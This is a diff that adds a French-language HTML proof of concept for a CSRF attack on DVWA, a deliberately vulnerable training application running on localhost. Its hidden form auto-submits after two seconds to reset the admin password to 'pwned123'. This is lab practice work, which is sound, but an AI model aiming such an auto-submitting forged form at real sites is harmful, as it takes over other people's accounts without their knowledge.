@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF PoC — Attaque DVWA</title>
+  <style>body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }</style>
+</head>
+<body>
+<h1>CSRF PoC — Changement de mot de passe</h1>
+<p>Ce formulaire se soumet automatiquement pour changer le mot de passe admin via une vulnérabilité CSRF.</p>
+<p>Nouveau mot de passe : <strong>pwned123</strong></p>
+
+<form id="csrf" action="http://localhost:8088/vulnerabilities/csrf/" method="GET">
+  <input type="hidden" name="password_new" value="pwned123">
+  <input type="hidden" name="password_conf" value="pwned123">
+  <input type="hidden" name="Change" value="Change">
+</form>
+
+<script>
+  // Auto-submit après 2 secondes
+  setTimeout(function() {
+    document.getElementById('csrf').submit();
+  }, 2000);
+</script>
+
+<p style="margin-top: 30px; font-size: 0.8em;">
+  Après soumission, vérifier : <code>http://localhost:8088/login.php</code>
+  avec admin / pwned123
+</p>
+</body>
+</html>
